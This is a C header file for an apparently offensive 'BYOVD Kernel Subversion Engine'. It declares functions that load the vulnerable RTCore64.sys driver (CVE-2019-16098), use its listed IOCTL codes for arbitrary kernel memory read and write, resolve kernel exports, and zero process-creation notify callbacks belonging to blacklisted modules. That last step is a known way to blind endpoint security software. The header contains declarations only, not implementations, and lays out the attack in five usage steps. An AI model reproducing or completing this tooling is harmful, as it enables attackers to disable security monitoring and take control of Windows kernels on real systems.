/*
 * byovd.h — DORM Phase 14: BYOVD Kernel Subversion Engine
 * byovd/kernel_subverter/byovd.h
 *
 * Windows x64 | MinGW/Clang | ring-3 loader + ring-0 R/W primitive
 *
 * Vulnerable driver: RTCore64.sys (MSI Afterburner ≤ 4.6.4.16117)
 *   CVE-2019-16098 — arbitrary kernel memory R/W via DeviceIoControl
 *   IOCTL read:  0x80002048
 *   IOCTL write: 0x8000204C
 *   Device path: \\.\RTCore64
 *
 * Usage pattern:
 *   1. byovd_load(path_to_RTCore64_sys)  — create service + start driver
 *   2. byovd_open()                      — open device handle
 *   3. byovd_read8/write8()              — arbitrary kernel R/W
 *   4. dorm_remove_process_callbacks()   — patch notify array
 *   5. byovd_unload()                    — stop service + delete
 *
 * Link: -lkernel32 -ladvapi32
 */
#pragma once
#include <windows.h>

/* ── kernel R/W primitive ──────────────────────────────────── */
BOOL byovd_load  (const char *driver_path);
BOOL byovd_open  (void);
void byovd_close (void);
BOOL byovd_unload(void);

/* Read/write 8 bytes at kernel_va. Smaller sizes use repeated 4-byte ops. */
BOOL byovd_read8 (ULONG64 kernel_va, ULONG64 *value_out);
BOOL byovd_write8(ULONG64 kernel_va, ULONG64  value);
BOOL byovd_read4 (ULONG64 kernel_va, ULONG   *value_out);
BOOL byovd_write4(ULONG64 kernel_va, ULONG    value);

/* ── kernel introspection helpers ──────────────────────────── */

/*
 * byovd_get_kernel_base — resolve ntoskrnl.exe load address via
 * NtQuerySystemInformation(SystemModuleInformation).
 * Returns 0 on failure.
 */
ULONG64 byovd_get_kernel_base(void);

/*
 * byovd_resolve_export — find VA of an ntoskrnl export by name.
 * Maps ntoskrnl from disk into a local view, resolves the export,
 * then applies the kernel-vs-disk base delta.
 * Returns 0 on failure.
 */
ULONG64 byovd_resolve_export(ULONG64 kernel_base, const char *export_name);

/* ── callback removal ──────────────────────────────────────── */

/*
 * dorm_enum_process_callbacks — enumerate PspCreateProcessNotifyRoutine
 * array entries. Prints each callback VA + owning module.
 * Returns callback count, -1 on failure.
 */
int dorm_enum_process_callbacks(const char *output_path);

/*
 * dorm_remove_process_callbacks — zero PspCreateProcessNotifyRoutine entries
 * whose owning module matches any string in module_blacklist[].
 * Pass NULL for module_blacklist to list-only (dry run).
 * Returns entries removed, -1 on failure.
 */
int dorm_remove_process_callbacks(const char **module_blacklist,
                                   int          blacklist_count,
                                   const char  *output_path);